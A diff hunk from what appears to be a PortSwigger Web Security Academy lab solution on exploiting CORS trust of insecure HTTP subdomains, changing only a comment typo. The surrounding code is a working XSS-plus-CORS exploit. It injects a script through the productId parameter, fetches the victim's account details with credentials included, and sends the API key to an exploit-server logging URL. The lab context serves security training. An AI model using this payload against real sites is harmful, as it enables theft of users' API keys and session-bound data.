@@ -11,7 +11,7 @@ Lab link: https://portswigger.net/web-security/cors/lab-breaking-https-attack
 <script>
 
     const lab_serv = '0a3b008c031f776781ccedea0019008b' //Change burp exercise lab id accordingly, then paste manually in the productId XSS payload (near the first fetch())
-    const exploit_serv =  '0ad000cc032277c68175ecd5017a00d7' //Change burp execrcise exploit id accordingly, then paste manually in the productId XSS payload (near the second fetch())
+    const exploit_serv =  '0ad000cc032277c68175ecd5017a00d7' //Change burp exercise exploit id accordingly, then paste manually in the productId XSS payload (near the second fetch())
     
     document.location="http://stock." + lab_serv + ".web-security-academy.net/?productId=4<script>function reqListener() { fetch('https://0a3b008c031f776781ccedea0019008b.web-security-academy.net/accountDetails', {credentials: 'include',}).then( async (response) => { let data = await response.json(); fetch('https://exploit-0ad000cc032277c68175ecd5017a00d7.exploit-server.net/log?key=' %2b data.apikey); }); } reqListener()%3c/script>&storeId=1"
     
